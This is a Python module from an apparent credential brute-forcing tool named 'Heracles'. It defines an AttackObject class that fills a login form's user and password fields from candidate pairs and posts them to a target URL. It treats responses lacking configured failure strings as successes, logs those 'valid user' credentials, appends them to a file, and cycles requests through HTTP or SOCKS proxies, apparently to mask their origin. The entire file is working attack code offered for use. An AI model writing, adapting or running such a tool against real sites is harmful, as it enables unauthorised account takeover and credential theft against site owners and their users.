"""
Project:Heracles
Last-Edit:Fri 13 Jan 2012
Site:http://darkpy.net/python/Heracles/

Author(s):
    v0mit: v0mit@darkpy.net
"""
import Heracles.http_handler, logging, sys


class AttackObject():
    def __init__(self, options, l_lvl=20):
        self.options = options


        if l_lvl == 10:
            logging.basicConfig(stream=sys.stderr, level=l_lvl,
                format='[%(levelname)s] (%(thread)d) %(message)s')
        else:
            logging.basicConfig(stream=sys.stderr, level=l_lvl,
                format='[%(levelname)s] %(message)s')

        try:
            self.form, bad = self.options.get("form").split(":")
        except ValueError as errno:
            logging.error(errno)
            sys.exit(1)

        self.bads = bad.split("|")

        buf_list = self.form.split("&")
        self.paras = {}
        self.user = None
        self.passwd = None
        for para in buf_list:
            if not para.find("*USER*") == -1:
                self.user = para.split("=")[0]
                continue

            if not para.find("*PASSWD*") == -1:
                self.passwd = para.split("=")[0]
                continue

            name, data = para.split("=")
            self.paras[name] = data

        if not self.user or not self.passwd:
            logging.error("Cannot find user/password parameter.")
            sys.exit(1)

        self.url = options.get("host")


    def doLogin(self, user, passwd, proxy=None):
        self.paras[self.user] = user
        self.paras[self.passwd] = passwd

        if proxy:
            data = self.doProxyLogin(proxy, self.options.get("verbose"))
            if not data:
                return None
        else:
            h = Heracles.http_handler.http_handler()

            try:
                data = h.request(self.url, data=self.paras)
            except Heracles.http_handler.HTTPError as errno:
                logging.debug(errno)
                return "PROXY FAIL"

        for bad in self.bads:
            if bad in data:
                logging.debug("{0}:{1} failed.".format(user, passwd))
                return None

        logging.info("Valid user found. {0}:{1}".format(user, passwd))

        if self.options.get("output_file"):
            try:
                output_file = open(self.options.get("output_file"), "a")
            except IOError as errno:
                logging.warning(errno)

                return user, passwd

            output_file.write("{0}:{1}".format(user, passwd))
            output_file.close()

        return user, passwd

    def doProxyLogin(self, proxy, logging_lvl):
        ip, port = proxy.split(":")
        if port in ["80", "8080", "3128"]: #Most HTTP proxies run on those ports.
            try:
                h = Heracles.http_handler.http_handler(("HTTP", proxy),
                    logging_lvl)
            except Heracles.http_handler.HTTPError as errno:
                logging.error(errno)
                return None

            try:
                data = h.request(self.url, data=self.paras)
            except Heracles.http_handler.HTTPError as errno:
                try:
                    h = Heracles.http_handler.http_handler(("SOCK", proxy),
                        logging_lvl)
                except Heracles.http_handler.HTTPError as errno:
                    logging.error(errno)
                    return None

                try:
                    data = h.request(self.url, data=self.paras)
                except Heracles.http_handler.HTTPError as errno:
                    logging.debug("{0}:{1} failed.".format(
                        self.user, self.passwd))
                    return None

                return data
            return data

        try:
            h = Heracles.http_handler.http_handler(("SOCK", proxy),
                logging_lvl)
        except Heracles.http_handler.HTTPError as errno:
            logging.error(errno)
            return None

        try:
            data = h.request(self.url, data=self.paras)
        except Heracles.http_handler.HTTPError as errno:
            try:
                h = Heracles.http_handler.http_handler(("HTTP", proxy),
                    logging_lvl)
            except Heracles.http_handler.HTTPError as errno:
                logging.error(errno)
                return None

            try:
                data = h.request(self.url, data=self.paras)
            except Heracles.http_handler.HTTPError as errno:
                logging.debug("{0}:{1} failed.".format(
                    self.user, self.passwd))
                return None

            return data
        return data